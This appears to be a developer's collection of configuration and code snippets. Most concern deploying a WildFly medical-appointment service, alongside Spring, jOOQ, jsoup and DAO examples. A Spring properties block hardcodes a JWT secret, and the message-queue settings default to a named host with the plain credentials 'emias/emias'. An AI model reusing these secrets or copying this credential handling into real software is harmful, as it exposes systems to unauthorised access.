        <blocking-timeout-millis>30000</blocking-timeout-millis>
    </timeout>
 <validation>
        <check-valid-connection-sql>select 1 from dual</check-valid-connection-sql>
        <validate-on-match>false</validate-on-match>
        <background-validation>true</background-validation>
        <background-validation-millis>10000</background-validation-millis>
        <use-fast-fail>true</use-fast-fail>
    </validation>
</datasource>


/system-property=rir.service.user:add(value="<RIR_USER>")
/system-property=dutydoctor.service.user:add(value="<DUTY_DOCTOR_USER>")
/system-property=contingent.service.user:add(value="<CONTINGENT_USER>")
/system-property=resources.service.address:add(value="<RESOURCES_URL>")
/system-property=schedule.service.address:add(value="<SCHEDULE_URL>")
/system-property=patient.service.address:add(value="<PATIENT_URL>")
/system-property=area.service.address:add(value="<AREA_URL>")
/system-property=app.time.zone:add(value="+03:00")
/system-property=spring.profiles.active:add(value="jndi")
/system-property=external.service.auth.token:add(value="<SERVICE_USER>")
/system-property=dutydoctor.service.address:add(value="<DUTY_DOCTOR_URL>")
/system-property=rir.service.user.super:add(value="<RIR_SUPER_USER>")
/system-property=systemlog.service.address:add(value="<SYSLOG_URL>")
/system-property=systemlog.service.user:add(value="<SYSLOG_USER>")
/system-property=treelogger.treeview:add(value="true")
/system-property=websphere.hostName:add(value="<WS_HOSTNAME>")
/system-property=websphere.port:add(value="<WS_PORT>")
/system-property=websphere.username:add(value="<WS_USERNAME>")
/system-property=websphere.password:add(value="<WS_PASSWORD>")
/system-property=websphere.channel:add(value="<WS_CHANEL>")
/system-property=websphere.transportType:add(value="CLIENT")
/system-property=websphere.queueManager:add(value="<WS_QUEUE_MANAGER>")
/system-property=websphere.queueName:add(value="<WS_QUEUE_NAME>")
/system-property=websphere.resource.adapter:add(value="wmq.jmsra.rar")
/system-property=anticorruption.rmi.service.port:add(value="1200")
/system-property=appointment.rmi.service.port:add(value="1201")
/system-property=rir.invoke.threads.max:add(value="4")
/system-property=rir.invoke.threads.params:add(value="20")


<system-properties>
    <property name="rir.service.user" value="<RIR_USER>"/>
    <property name="dutydoctor.service.user" value="<DUTY_DOCTOR_USER>"/>
 <property name="contingent.service.user" value="<CONTINGENT_USER>"/>
    <property name="resources.service.address" value="<RESOURCES_URL>"/>
    <property name="schedule.service.address" value="<SCHEDULE_URL>"/>
	 <property name="patient.service.address" value="<PATIENT_URL>"/>
	 <property name="area.service.address" value="<AREA_URL>"/>
    <property name="spring.profiles.active" value="jndi"/>
    <property name="app.time.zone" value="+03:00"/>
	 <property name="dutydoctor.service.address" value="<DUTY_DOCTOR_URL>"/>
	 <property name=" external.service.auth.token" value="<SERVICE_USER>"/>
	 <property name="rir.service.user.super" value="<RIR_SUPER_USER>"/>
	 <property name="systemlog.service.user" value="<SYSLOG_USER>"/>
	 <property name="systemlog.service.address" value="<SYSLOG_URL>"/>
	 <property name="treelogger.treeview" value="true"/>
    <property name="websphere.hostName" value="<WS_HOSTNAME>"/>
    <property name="websphere.port" value="<WS_PORT>"/>
    <property name="websphere.username" value="<WS_USERNAME>"/>
    <property name="websphere.password" value="<WS_PASSWORD>"/>
    <property name="websphere.channel" value="<WS_CHANEL>"/>
    <property name="websphere.transportType" value="CLIENT"/>
    <property name="websphere.queueManager" value="<WS_QUEUE_MANAGER>"/>
    <property name="websphere.queueName" value="<WS_QUEUE_NAME>"/>
    <property name="websphere.resource.adapter" value="wmq.jmsra.rar"/>
	 <property name=" anticorruption.rmi.service.port " value="1200"/>
    <property name=" appointment.rmi.service.port" value="1201"/>
    <property name="rir.invoke.threads.max" value="<MAX_THREADS>"/>
    <property name="rir.invoke.threads.params" value="PARAMS_PER_THREAD"/>
</system-properties>


/subsystem=infinispan/cache-container=RegisterCache:add(default-cache=default,start="EAGER")
/subsystem=infinispan/cache-container=RegisterCache/local-cache=default:add(batching="true",start="EAGER",module="org.infinispan")
/subsystem=infinispan/cache-container=RegisterCache/local-cache=default/file-store=FILE_STORE:add(path="register-cache",relative-to="jboss.server.temp.dir", shared=true,preload=true,passivation=false,fetch-state=true,purge=false,singleton=false

<subsystem xmlns="urn:jboss:domain:infinispan:2.0">
<cache-container name="RegisterCache" default-cache="default" start="EAGER">
<local-cache name="default" start="EAGER" batching="true" module="org.infinispan">
<file-store shared="true" preload="true" passivation="false" fetch-state="true" purge="false" singleton="false" relative-to="jboss.server.temp.dir" path="register-cache"/>
</local-cache>
 </cache-container>


/subsystem=logging/async-handler=logger:add(queue-length="16384",overflow-action="block",level="DEBUG")
/subsystem=logging/async-handler=logger:assign-subhandler(name="FILE")

/subsystem=logging/root-logger=ROOT:root-logger-assign-handler(name="logger")
/subsystem=logging/root-logger=ROOT:root-logger-unassign-handler(name="CONSOLE")
/subsystem=logging/root-logger=ROOT:root-logger-unassign-handler(name="FILE")

/subsystem=logging/logger=ru.gov.emias2/:add(category=ru.gov.emias2,level=DEBUG)
/subsystem=logging/logger=org.apache.camel/:add(category=org.apache.camel,level=DEBUG)

/subsystem=logging/logger=ru.gov.emias2/:add(category=ru.gov.emias2,level=INFO)
/subsystem=logging/logger=ru.gov.emias2/:add(category=ru.gov.emias2,level=DEBUG)
/subsystem=logging/logger=org.apache.camel/:add(category=org.apache.camel,level=DEBUG)

<subsystem xmlns="urn:jboss:domain:logging:2.0">
    <async-handler name="logger">
        <level name="DEBUG"/>
        <queue-length value="16384"/>
        <overflow-action value="block"/>
        <subhandlers>
            <handler name="FILE"/>
        </subhandlers>
    </async-handler>
    <periodic-rotating-file-handler name="FILE" autoflush="true">
        <formatter>
           <named-formatter name="PATTERN"/>
        </formatter>
        <file relative-to="jboss.server.log.dir" path="server.log"/>
        <suffix value=".yyyy-MM-dd"/>
        <append value="true"/>
    </periodic-rotating-file-handler>    
    <logger category="org.apache.tomcat.util.modeler">
        <level name="WARN"/>
    </logger>
    <logger category="org.jboss.as.config">
        <level name="DEBUG"/>
    </logger>
    <logger category="sun.rmi">
        <level name="WARN"/>
    </logger>
    <logger category="org.switchyard">
        <level name="INFO"/>
    </logger>
    <logger category="org.apache.deltaspike.core.api.provider.BeanManagerProvider">
        <level name="ERROR"/>
    </logger>
    <logger category="ru.gov.emias2">
        <level name="DEBUG"/>
    </logger>    
    <root-logger>
        <level name="INFO"/>
        <handlers>
            <handler name="logger"/>
        </handlers>
    </root-logger>
    <formatter name="PATTERN">
        <pattern-formatter pattern="%d{yyyy-MM-dd HH:mm:ss,SSS} %-5p [%c] (%t) %s%E%n"/>
    </formatter>
</subsystem>


/subsystem=undertow/server=default-server/http-listener=default:write-attribute(name="max-post-size",value="419430400")

<subsystem xmlns="urn:jboss:domain:undertow:1.2">
  <server name="default-server">
    <http-listener name="default" socket-binding="http" max-post-size="419430400"/>

/subsystem=switchyard/module=org.switchyard.component.spring.invoker:add(implClass="org.switchyard.component.spring.invoker.deploy.SpringInvokeComponent")

<module identifier="org.switchyard.component.spring.invoker" implClass="org.switchyard.component.spring.invoker.deploy.SpringInvokeComponent"/>


/subsystem=webservices/:write-attribute(name=wsdl-port,value=<domain_port>)
/subsystem=webservices/:write-attribute(name=wsdl-host,value=<domain_address>)


/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar:add(archive=wmq.jmsra.rar, transaction-support=NoTransaction)

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME:add(class-name=com.ibm.mq.connector.outbound.ManagedConnectionFactoryImpl, jndi-name=java:jboss/MQ.CONNECTIONFACTORY.NAME)

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=hostName/:add(value=${websphere.hostName:etp3.sm-soft.ru})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=port/:add(value=${websphere.port:2424})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=username/:add(value=${websphere.username:emias})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=password/:add(value=${websphere.password:emias})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=channel/:add(value=${websphere.channel:CLIENT.EMIAS.SVRCONN})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=transportType/:add(value=${websphere.transportType:CLIENT})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/connection-definitions=MQ.CONNECTIONFACTORY.NAME/config-properties=queueManager/:add(value=${websphere.queueManager:GU01QM})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/admin-objects=MQ.QUEUE.NAME:add(class-name=com.ibm.mq.connector.outbound.MQQueueProxy, jndi-name=java:jboss/MQ.QUEUE.NAME)

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/admin-objects=MQ.QUEUE.NAME/config-properties=baseQueueName/:add(value=${websphere.queueName:EMIAS.SRVC.STATUS_OUT})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar/admin-objects=MQ.QUEUE.NAME/config-properties=baseQueueManagerName/:add(value=${websphere.queueManager:GU01QM})

/subsystem=resource-adapters/resource-adapter=wmq.jmsra.rar:activate


<resource-adapters>
                <resource-adapter id="wmq.jmsra.rar">
                    <archive>
                        wmq.jmsra.rar
                    </archive>
                    <transaction-support>NoTransaction</transaction-support>
                    <connection-definitions>
                        <connection-definition class-name="com.ibm.mq.connector.outbound.ManagedConnectionFactoryImpl" jndi-name="java:jboss/MQ.CONNECTIONFACTORY.NAME" pool-name="MQ.CONNECTIONFACTORY.NAME">
                            <config-property name="hostName">
                                ${websphere.hostName:etp3.sm-soft.ru}
                            </config-property>
                            <config-property name="port">
                                ${websphere.port:2424}
                            </config-property>
                            <config-property name="username">
                                ${websphere.username:emias}
                            </config-property>
                            <config-property name="password">
                                ${websphere.password:emias}
                            </config-property>
                            <config-property name="channel">
                                ${websphere.channel:CLIENT.EMIAS.SVRCONN}
                            </config-property>
                            <config-property name="transportType">
                                ${websphere.transportType:CLIENT}
                            </config-property>
                            <config-property name="queueManager">
                                ${websphere.queueManager:GU01QM}
                            </config-property>
                        </connection-definition>
                    </connection-definitions>
                    <admin-objects>
                        <admin-object class-name="com.ibm.mq.connector.outbound.MQQueueProxy" jndi-name="java:jboss/MQ.QUEUE.NAME" pool-name="MQ.QUEUE.NAME">
                            <config-property name="baseQueueName">
                                ${websphere.queueName:EMIAS.SRVC.STATUS_OUT}
                            </config-property>
                            <config-property name="baseQueueManagerName">
                                ${websphere.queueManager:GU01QM}
                            </config-property>
                        </admin-object>
                    </admin-objects>
                </resource-adapter>
            </resource-adapters>


ant clean sjc
ant -Declipse.home=/path/to/eclipse clean release
--------------------------------------------------------------------------------------------------------
		<dependency>
			<groupId>jdk.tools</groupId>
			<artifactId>jdk.tools</artifactId>
			<version>1.8</version>
			<scope>system</scope>
			<systemPath>${JAVA_HOME}/lib/tools.jar</systemPath>
		</dependency>
--------------------------------------------------------------------------------------------------------
#!/bin/bash
#
# The MIT License
# Copyright (c) 2014-2016 Ilkka Seppälä
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
#


# Clone gh-pages
git clone -b gh-pages "https://${GH_REF}" ghpagesclone
cd ghpagesclone

# Init and update submodule to latest
git submodule update --init --recursive
git submodule update --remote

# Setup Git
git config user.name "Travis-CI"
git config user.email "travis@no.reply"

# If there is a new version of the master branch
if git status | grep patterns > /dev/null 2>&1
then
  # it should be committed
  git add .
  git commit -m ":sparkles: :up: Automagic Update via Travis-CI"
  git push --quiet "https://${GH_TOKEN}:x-oauth-basic@${GH_REF}" gh-pages > /dev/null 2>&1
fi
--------------------------------------------------------------------------------------------------------
CREATE TABLE testing.persons
(
  person_id  INTEGER NOT NULL,
  last_name  VARCHAR(255),
  first_name VARCHAR(255),
  address    VARCHAR(255),
  city       VARCHAR(255),
  CONSTRAINT persons_pk PRIMARY KEY (person_id)
);

CREATE TABLE testing.orders
(
  order_id          INTEGER NOT NULL,
  order_no          INTEGER NOT NULL,
  order_date        DATE    NOT NULL,
  shipping_datetime TIMESTAMP,
  shipped           BOOLEAN NOT NULL,
  person_id         INTEGER,
  CONSTRAINT orders_pk PRIMARY KEY (order_id),
  CONSTRAINT persons_fk FOREIGN KEY (person_id) REFERENCES persons (person_id)
);

CREATE TABLE testing.items
(
  item_id    INTEGER        NOT NULL,
  item_name  VARCHAR(255)   NOT NULL,
  item_price NUMERIC(10, 4) NOT NULL,
  CONSTRAINT items_pk PRIMARY KEY (item_id)
);

CREATE TABLE testing.order_items(
  order_id INTEGER NOT NULL,
  item_id  INTEGER NOT NULL,
  qty      INTEGER NOT NULL,
  CONSTRAINT order_items_pk PRIMARY KEY (order_id, item_id),
  CONSTRAINT order_fk FOREIGN KEY (order_id) REFERENCES orders (order_id),
  CONSTRAINT items_fk FOREIGN KEY (item_id) REFERENCES items (item_id)
);
--------------------------------------------------------------------------------------------------------
jOOQ
I'm going to answer the jOOQ part of your question. As of jOOQ 3.8, there have now been quite a few additional features related to combining jOOQ with Stream. Other usages are also documented on this jOOQ page.

Your suggested usage:
You tried this:

Stream<Record> stream = DSL.using(connection).fetch(resultSet).stream();
Indeed, this doesn't work well for large result sets because fetch(ResultSet) fetches the entire result set into memory and then calls Collection.stream() on it.

Better (lazy) usage:
Instead, you could write this:

try (Stream<Record> stream = DSL.using(connection).fetchStream(resultSet)) {
    ...
}
... which is essentially convenience for this:

try (Cursor<Record> cursor = DSL.using(connection).fetchLazy(resultSet)) {
    Stream<Record> stream = cursor.stream();
    ...
}
See also DSLContext.fetchStream(ResultSet)

Of course, you could also let jOOQ execute your SQL string, rather than wrestling with JDBC:

try (Stream<Record> stream = 
     DSL.using(dataSource)
        .resultQuery("select * from {0}", DSL.name(table)) // Prevent SQL injection
        .fetchSize(5000)
        .fetchStream()) {
    ...
}
On try-with-resources usage
Do note that a Stream produced by jOOQ is "resourceful", i.e. it contains a reference to an open ResultSet (and PreparedStatement). So, if you really want to return that stream outside of your method, make sure it is closed properly!

shareimprove this answer
--------------------------------------------------------------------------------------------------------
mvn validate
mvn package -Pmigrate-emias-cluster -Ddb.url=jdbc:oracle:thin:@<ADDRESS>:<PORT>:<DATABASENAME> -Ddb.login=<LOGIN> -Ddb.password=<PASSWORD>
--------------------------------------------------------------------------------------------------------
Для создания резервной копии конфигурационных и war файлов выполнить:
mkdir backup-$(date +%y%m%d-%H%M)

cp  /opt/wildfly/standalone/configuration/standalone.xml <%path_to_backup_folder%>
cp  /opt/wildfly/bin/standalone.conf  <%path_to_backup_folder%>

cp pguref/register-appointment/register-appointment-anticorruption-service/target/register-appointment-anticorruption-service-1.0-SNAPSHOT.war <%path_to_backup_folder%>

cp pguref/register-appointment/register-appointment-composite/target/register-appointment-composite-1.0-SNAPSHOT.war conf <%path_to_backup_folder%>

cp pguref/register-appointment/register-appointment-service/target/register-appointment-service-1.0-SNAPSHOT.war  <%path_to_backup_folder%>


deploy –-force /каталог-артефактов/register-appointment-service-1.0-SNAPSHOT.war
deploy –-force /каталог-артефактов/ register-appointment-anticorruption-service-1.0-SNAPSHOT.war
deploy –-force /каталог-артефактов/register-appointment-composite-1.0-SNAPSHOT.war

deploy –l

undeploy имя-артефакта.war

quit
--------------------------------------------------------------------------------------------------------
# Algumas variaveis de ambiente, por enquanto apenas essas (conveniência)
server.context-path=/quantocusta/api
spring.jpa.hibernate.ddl-auto=none
spring.datasource.url=jdbc:mysql://localhost/quantocusta
spring.datasource.username=${quantocusta_db_user}
spring.datasource.password=${quantocusta_db_senha}
spring.datasource.driver-class-name=com.mysql.jdbc.Driver

# JWT
jwt.secret=_@htpa-0329i98d9wahJk283287*!8!!,;.232lOJDhdq
jwt.expiration=604800

# CORS
cors.origin=${quantocusta_cors_origin}

#Email
spring.mail.host=smtp.gmail.com
spring.mail.port=587 
spring.mail.username=${quantocusta_email_endereco}
spring.mail.password=${quantocusta_email_senha}
spring.mail.protocol=smtp
spring.mail.defaultEncoding=UTF-8
spring.mail.properties.mail.smtp.auth=true
spring.mail.properties.mail.smtp.starttls.enable=true
spring.mail.properties.mail.smtp.starttls.required=true
spring.mail.test-connection=true
spring.mail.properties.mail.smtp.ssl.trust=smtp.gmail.com
spring.mail.properties.mail.smtp.socketFactory.fallbacktrue


GET <host>:<port>/api/v1/confirmations/reject/uid/<uid>/cid/<cid>
--------------------------------------------------------------------------------------------------------
import org.jsoup.HttpStatusException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.parser.Tag;
import org.jsoup.select.Elements;
import org.junit.Before;
import org.junit.Test;

import java.io.IOException;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class JsoupParserIntegrationTest {

    private Document doc;

    @Before
    public void setUp() throws IOException {
        doc = Jsoup.connect("https://spring.io/blog")
            .get();
    }

    @Test
    public void loadDocument404() throws IOException {
        try {
            doc = Jsoup.connect("https://spring.io/will-not-be-found")
                .get();
        } catch (HttpStatusException ex) {
            assertEquals(404, ex.getStatusCode());
        }
    }

    @Test
    public void loadDocumentCustomized() throws IOException {
        doc = Jsoup.connect("https://spring.io/blog")
            .userAgent("Mozilla")
            .timeout(5000)
            .cookie("cookiename", "val234")
            .cookie("anothercookie", "ilovejsoup")
            .referrer("http://google.com")
            .header("headersecurity", "xyz123")
            .get();
    }

    @Test
    public void examplesSelectors() {
        Elements links = doc.select("a");
        Elements logo = doc.select(".spring-logo--container");
        Elements pagination = doc.select("#pagination_control");
        Elements divsDescendant = doc.select("header div");
        Elements divsDirect = doc.select("header > div");

        Element pag = doc.getElementById("pagination_control");
        Elements desktopOnly = doc.getElementsByClass("desktopOnly");

        Elements sections = doc.select("section");
        Element firstSection = sections.first();
        Elements sectionParagraphs = firstSection.select(".paragraph");
    }

    @Test
    public void examplesTraversing() {
        Elements sections = doc.select("section");

        Element firstSection = sections.first();
        Element lastSection = sections.last();
        Element secondSection = sections.get(2);
        Elements allParents = firstSection.parents();
        Element parent = firstSection.parent();
        Elements children = firstSection.children();
        Elements siblings = firstSection.siblingElements();

        sections.forEach(el -> System.out.println("section: " + el));
    }

    @Test
    public void examplesExtracting() {
        Element firstArticle = doc.select("article")
            .first();
        Element timeElement = firstArticle.select("time")
            .first();
        String dateTimeOfFirstArticle = timeElement.attr("datetime");
        Element sectionDiv = firstArticle.select("section div")
            .first();
        String sectionDivText = sectionDiv.text();
        String articleHtml = firstArticle.html();
        String outerHtml = firstArticle.outerHtml();
    }

    @Test
    public void examplesModifying() {
        Element firstArticle = doc.select("article")
            .first();
        Element timeElement = firstArticle.select("time")
            .first();
        Element sectionDiv = firstArticle.select("section div")
            .first();

        String dateTimeOfFirstArticle = timeElement.attr("datetime");
        timeElement.attr("datetime", "2016-12-16 15:19:54.3");
        sectionDiv.text("foo bar");
        firstArticle.select("h2")
            .html("<div><span></span></div>");

        Element link = new Element(Tag.valueOf("a"), "").text("Checkout this amazing website!")
            .attr("href", "http://baeldung.com")
            .attr("target", "_blank");
        firstArticle.appendChild(link);

        doc.select("li.navbar-link")
            .remove();
        firstArticle.select("img")
            .remove();

        assertTrue(doc.html()
            .contains("http://baeldung.com"));
    }
}
https://github.com/PlamenStilyianov/FinMathematics
https://github.com/vtraida/books
https://github.com/bradtraversy/bookstore
https://github.com/Larry3z/HadoopRelatedBooks
https://github.com/burakbayramli/books
https://github.com/eucaeuca/bookshelf
https://github.com/arpitjindal97/technology_books
https://github.com/shivamms/books/tree/master/nlp
https://github.com/woooowen/iBooks
https://github.com/jasonim/ebook
https://github.com/arasty/books
https://github.com/woai3c/recommended-books
https://github.com/Eugen123/Books
https://github.com/RongleXie/java-books-collections
https://github.com/randytorres/Books
https://github.com/thinkphp/nodejs-books/tree/master/public
https://github.com/fabbbiob/e-books
https://github.com/TonnnnnnyLiu/Books
https://github.com/loveunk/Deep-learning-books
https://github.com/jcnlp/books
https://github.com/zengfeng/books
https://github.com/woai3c/recommended-books
https://github.com/ITboy/book
https://github.com/sumit0690/Free-DevOps-Books
https://github.com/neverusedname/MyBooks
https://github.com/ccpaging/books
https://github.com/jiankunking/books-recommendation
https://github.com/nairuzabulhul/E-Books
https://github.com/zslucky/awesome-AI-books
https://github.com/snakeliwei/geek-programming-books

https://github.com/vfarcic/books-ms
https://github.com/Norbert515/BookSearch
https://github.com/librariesio/libraries.io
https://github.com/SAFE-Stack/SAFE-BookStore
https://github.com/SAFE-Stack/SAFE-BookStore
https://github.com/KingJeason/wepy-books
https://github.com/rstudio/bookdown
https://github.com/ericzhang-cn/kindle-open-books
https://github.com/notwaldorf/emoji-translate
https://github.com/withstars/Books-Management-System
https://github.com/stummjr/books_crawler
https://github.com/bitsai/book-exercises
https://github.com/cs-books/influential-cs-books
https://github.com/eson15/Javaweb_bookstore
https://github.com/essentialbooks/books
--------------------------------------------------------------------------------------------------------
sudo docker-compose -f docker-compose-dev.yml run testsLocal

sudo docker build -t vfarcic/books-ms .

sudo docker push vfarcic/books-ms

sudo docker-compose -f docker-compose-dev.yml up feTests
sudo docker-compose -f docker-compose-dev.yml up integ

sudo docker build -t vfarcic/books-ms-tests -f Dockerfile.test .
    
sudo docker push vfarcic/books-ms-tests
--------------------------------------------------------------------------------------------------------
import com.book.domain.ReaderInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.core.RowCallbackHandler;
import org.springframework.stereotype.Repository;

import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.Date;

@Repository
public class ReaderInfoDao {

    private JdbcTemplate jdbcTemplate;

    private final static String ADD_READER_INFO_SQL="INSERT INTO reader_info VALUES(?,?,?,?,?,?)";
    private final static String DELETE_READER_INFO_SQL="DELETE FROM reader_info where reader_id = ? ";
    private final static String GET_READER_INFO_SQL="SELECT * FROM reader_info where reader_id = ? ";
    private final static String UPDATE_READER_INFO="UPDATE reader_info set name = ? ,sex = ? ,birth = ? ,address = ? ,telcode = ? where reader_id = ? ";
    private final static String ALL_READER_INFO_SQL="SELECT * FROM reader_info";


    public ArrayList<ReaderInfo> getAllReaderInfo() {
        final ArrayList<ReaderInfo> readers=new ArrayList<ReaderInfo>();
        jdbcTemplate.query(ALL_READER_INFO_SQL, new RowCallbackHandler() {
            public void processRow(ResultSet resultSet) throws SQLException {
                resultSet.beforeFirst();
                while (resultSet.next()){
                    ReaderInfo reader=new ReaderInfo();
                    reader.setAddress(resultSet.getString("address"));
                    reader.setBirth(resultSet.getDate("birth"));
                    reader.setName(resultSet.getString("name"));
                    reader.setReaderId(resultSet.getInt("reader_id"));
                    reader.setSex(resultSet.getString("sex"));
                    reader.setTelcode(resultSet.getString("telcode"));
                    readers.add(reader);
                }
            }
        });
        return readers;
    }

    @Autowired
    public void setJdbcTemplate(JdbcTemplate jdbcTemplate) {
        this.jdbcTemplate = jdbcTemplate;
    }

    public ReaderInfo findReaderInfoByReaderId(int readerId){
        final ReaderInfo reader=new ReaderInfo();
        jdbcTemplate.query(GET_READER_INFO_SQL, new Object[]{readerId}, new RowCallbackHandler() {
            public void processRow(ResultSet resultSet) throws SQLException {
                reader.setAddress(resultSet.getString("address"));
                reader.setBirth(resultSet.getDate("birth"));
                reader.setName(resultSet.getString("name"));
                reader.setReaderId(resultSet.getInt("reader_id"));
                reader.setSex(resultSet.getString("sex"));
                reader.setTelcode(resultSet.getString("telcode"));
            }
        });
        return reader;
    }

    public int deleteReaderInfo(int readerId){
        return jdbcTemplate.update(DELETE_READER_INFO_SQL,readerId);
    }

    public int editReaderInfo(ReaderInfo readerInfo){
        String address=readerInfo.getAddress();
        Date birth=readerInfo.getBirth();
        String name=readerInfo.getName();
        int readerId=readerInfo.getReaderId();
        String sex=readerInfo.getSex();
        String telcode=readerInfo.getTelcode();
        return jdbcTemplate.update(UPDATE_READER_INFO,new Object[]{name,sex,birth,address,telcode,readerId});
    }

    public int addReaderInfo(ReaderInfo readerInfo){
        String address=readerInfo.getAddress();
        Date birth=readerInfo.getBirth();
        String name=readerInfo.getName();
        String sex=readerInfo.getSex();
        String telcode=readerInfo.getTelcode();
        int readerId=readerInfo.getReaderId();

        return jdbcTemplate.update(ADD_READER_INFO_SQL,new Object[]{readerId,name,sex,birth,address,telcode});
    }
}
--------------------------------------------------------------------------------------------------------
 Supported parse format: [yyyy-MM-dd|yyyyMMdd][T(hh:mm[:ss[.sss]]|hhmm[ss[.sss]])]?[Z|[+-]hh[:]mm]]
--------------------------------------------------------------------------------------------------------
mvn tomcat7:run
--------------------------------------------------------------------------------------------------------
	@Convert(converter = CoverConverter.class)
	private Cover cover;
	
	import javax.persistence.AttributeConverter;
import javax.persistence.Converter;

import static com.blogspot.nurkiewicz.Cover.*;

@Converter
public class CoverConverter implements AttributeConverter<Cover, String> {

	@Override
	public String convertToDatabaseColumn(Cover attribute) {
		switch (attribute) {
			case DUST_JACKET:
				return "D";
			case HARDCOVER:
				return "H";
			case PAPERBACK:
				return "P";
			default:
				throw new IllegalArgumentException("Unknown" + attribute);
		}
	}

	@Override
	public Cover convertToEntityAttribute(String dbData) {
		switch (dbData) {
			case "D":
				return DUST_JACKET;
			case "H":
				return HARDCOVER;
			case "P":
				return PAPERBACK;
			default:
				throw new IllegalArgumentException("Unknown" + dbData);
		}
	}
}
--------------------------------------------------------------------------------------------------------
import org.eclipse.persistence.logging.AbstractSessionLog;
import org.eclipse.persistence.logging.SessionLog;
import org.eclipse.persistence.logging.SessionLogEntry;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.util.StringUtils;

import java.util.HashMap;
import java.util.Map;

/**
 * Based on: https://gist.github.com/msosvi/1325764
 */
public class Slf4jSessionLogger extends AbstractSessionLog {

	public static final String ECLIPSELINK_NAMESPACE = "org.eclipse.persistence.logging";
	public static final String DEFAULT_CATEGORY = "default";

	public static final String DEFAULT_ECLIPSELINK_NAMESPACE = ECLIPSELINK_NAMESPACE
			+ "." + DEFAULT_CATEGORY;

	private Map<String, Logger> categoryLoggers = new HashMap<>();

	public Slf4jSessionLogger() {
		for (String category : SessionLog.loggerCatagories) {
			addLogger(category, ECLIPSELINK_NAMESPACE + "." + category);
		}
		addLogger(DEFAULT_CATEGORY, DEFAULT_ECLIPSELINK_NAMESPACE);
	}

	@Override
	public void log(SessionLogEntry entry) {
		if (shouldLog(entry.getLevel(), entry.getNameSpace())) {
			final Logger logger = getLogger(entry.getNameSpace());
			final LogLevel logLevel = toLogLevel(entry.getLevel());
			final String message = getSupplementDetailString(entry) + formatMessage(entry);
			switch (logLevel) {
				case TRACE:
					logger.trace(message);
					break;
				case DEBUG:
					logger.debug(message);
					break;
				case INFO:
					logger.info(message);
					break;
				case WARN:
					logger.warn(message);
					break;
				case ERROR:
					logger.error(message);
					break;
			}
		}
	}

	@Override
	public boolean shouldLog(int level, String category) {
		Logger logger = getLogger(category);
		switch (toLogLevel(level)) {
			case TRACE:
				return logger.isTraceEnabled();
			case DEBUG:
				return logger.isDebugEnabled();
			case INFO:
				return logger.isInfoEnabled();
			case WARN:
				return logger.isWarnEnabled();
			case ERROR:
				return logger.isErrorEnabled();
			default:
				return false;
		}
	}

	@Override
	public boolean shouldLog(int level) {
		return shouldLog(level, "default");
	}

	@Override
	public boolean shouldDisplayData() {
		return this.shouldDisplayData != null && shouldDisplayData;
	}

	private void addLogger(String loggerCategory, String loggerNameSpace) {
		categoryLoggers.put(loggerCategory,
				LoggerFactory.getLogger(loggerNameSpace));
	}

	private Logger getLogger(String category) {

		if (!StringUtils.hasText(category)
				|| !this.categoryLoggers.containsKey(category)) {
			category = DEFAULT_CATEGORY;
		}
		return categoryLoggers.get(category);
	}

	private LogLevel toLogLevel(int level) {
		switch (level) {
			case SessionLog.ALL:
				return LogLevel.TRACE;
			case SessionLog.FINEST:
				return LogLevel.TRACE;
			case SessionLog.FINER:
				return LogLevel.TRACE;
			case SessionLog.FINE:
				return LogLevel.DEBUG;
			case SessionLog.CONFIG:
				return LogLevel.DEBUG;
			case SessionLog.INFO:
				return LogLevel.INFO;
			case SessionLog.WARNING:
				return LogLevel.WARN;
			case SessionLog.SEVERE:
				return LogLevel.ERROR;
			default:
				return LogLevel.OFF;
		}
	}

	private enum LogLevel {
		TRACE, DEBUG, INFO, WARN, ERROR, OFF
	}

}
--------------------------------------------------------------------------------------------------------
import com.googlecode.flyway.core.Flyway;
import org.eclipse.persistence.jpa.PersistenceProvider;
import org.h2.jdbcx.JdbcDataSource;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.DependsOn;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
